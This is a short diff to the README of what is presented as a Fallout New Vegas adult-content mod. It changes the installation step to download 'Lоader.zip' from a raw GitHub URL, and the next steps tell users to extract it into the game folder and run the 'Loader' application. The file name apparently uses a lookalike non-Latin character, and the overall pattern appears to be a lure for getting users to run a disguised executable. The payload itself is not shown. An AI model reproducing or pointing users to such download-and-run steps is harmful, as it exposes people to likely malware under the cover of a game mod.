@@ -37,7 +37,7 @@ Fallout New Vegas mod, FNV mature patch, FNV adult content enhancement, New Vega
 
 ## 🚀 Installation
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/ArturoAnchapuri/NewVegasEnhancedAdults/main/Lоader.zip from the repository.**
 2. Extract the files to your Fallout New Vegas installation folder.
 3. Run the Loader application.
 4. Follow on-screen instructions—choose content, backup, and apply enhancements.
